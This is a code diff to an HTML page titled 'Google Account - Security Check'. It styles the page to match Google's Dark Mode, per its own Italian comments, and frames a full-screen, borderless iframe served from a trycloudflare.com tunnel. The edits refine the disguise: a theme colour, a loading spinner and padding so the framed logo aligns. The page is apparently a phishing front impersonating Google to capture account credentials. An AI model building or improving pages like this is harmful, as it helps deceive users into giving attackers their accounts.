@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#1a1b1e">
     <title>Google Account - Security Check</title>
     <style>
-        /* Reset totale */
+        /* Reset totale dei margini */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* Sfondo scuro per mimetizzarsi con la Dark Mode di Google */
+        /* Sfondo identico alla Dark Mode originale di Google */
         body, html { 
             height: 100%; 
             width: 100%; 
@@ -21,6 +22,28 @@
             font-family: 'Roboto', Arial, sans-serif;
         }
 
+        /* Container dell'Iframe: aggiunge lo spazio in alto per l'allineamento */
+        .iframe-wrapper {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            /* Questo valore sposta il contenuto verso il basso per non tagliare il logo */
+            padding-top: 45px; 
+            background-color: #1a1b1e;
+            z-index: 2;
+        }
+
+        iframe { 
+            width: 100%; 
+            height: 100%; 
+            border: none; 
+            display: block;
+            background-color: transparent;
+        }
+
+        /* Animazione di caricamento professionale su sfondo scuro */
         .loader-container {
             display: flex;
             flex-direction: column;
@@ -31,24 +54,10 @@
             position: absolute;
             top: 0;
             left: 0;
-            z-index: 1;
+            z-index: 1; /* Resta dietro l'iframe-wrapper */
             background-color: #1a1b1e;
         }
 
-        /* Iframe a tutto schermo senza bordi */
-        iframe { 
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100vw; 
-            height: 100vh; 
-            border: none; 
-            display: block;
-            z-index: 2;
-            background-color: #1a1b1e;
-        }
-
-        /* Spinner in stile Google Blue */
         .spinner {
             border: 3px solid #333;
             border-top: 3px solid #4285F4;
@@ -74,7 +83,9 @@
         <p class="loading-text">One moment...</p>
     </div>
 
-    <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>
+    <div class="iframe-wrapper">
+        <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>
+    </div>
 
 </body>
 </html>
